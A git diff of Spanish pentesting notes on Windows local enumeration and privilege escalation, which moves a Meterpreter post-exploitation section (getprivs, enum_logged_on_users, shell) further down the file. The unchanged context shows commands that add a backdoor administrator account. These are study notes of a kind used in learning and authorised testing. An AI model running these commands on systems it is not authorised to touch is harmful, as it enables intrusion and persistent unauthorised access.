@@ -12,25 +12,6 @@ Tags: #LocalEnumeration #PrivEsc #Windows  #Meterpreter
 4. Grupos
 5. Miembros del grupo de administrador 
 ```
-
-## Comandos con Meterpreter 
-
-```bash 
-❯ getprivs                        # Enumeramos los privilegios del usuario actual  
-
-❯ sessions <ID>                   # Regresas a la sesión de Meterpreter que tenias
-
-❯ background                      # Tambien podemos usar (Ctrl + z) para poner la sesión en segundo plano y poder buscar exploits
-	❯ search logged_on           # Exploit para enumerar usuarios que estan loggeados en Windows 
-	❯ use post/windows/gather/enum_logged_on_users
-	❯ options 
-	❯ set SESSION <ID>           # Colocamos el ID de la sesión en background y lo podemos obtener con el comando 'sessions'
-	❯ run 
-
-
-❯ shell                           # Generas una consola para comandos Windows 
-```
-
 ## Comandos Windows 
 
 ```bash
@@ -55,3 +36,21 @@ Tags: #LocalEnumeration #PrivEsc #Windows  #Meterpreter
 ❯ net user omar P4ssw0rd /add               # Crear un usuario siendo NT Authority\System de forma local
 ❯ net localgroup Administrators omar /add   # Agregar al usuario al grupo local 'Administrators'
 ```
+## Comandos con Meterpreter 
+
+```bash 
+❯ getprivs                        # Enumeramos los privilegios del usuario actual  
+
+❯ sessions <ID>                   # Regresas a la sesión de Meterpreter que tenias
+
+❯ background                      # Tambien podemos usar (Ctrl + z) para poner la sesión en segundo plano y poder buscar exploits
+	❯ search logged_on           # Exploit para enumerar usuarios que estan loggeados en Windows 
+	❯ use post/windows/gather/enum_logged_on_users
+	❯ options 
+	❯ set SESSION <ID>           # Colocamos el ID de la sesión en background y lo podemos obtener con el comando 'sessions'
+	❯ run 
+
+
+❯ shell                           # Generas una consola para comandos Windows 
+```
+
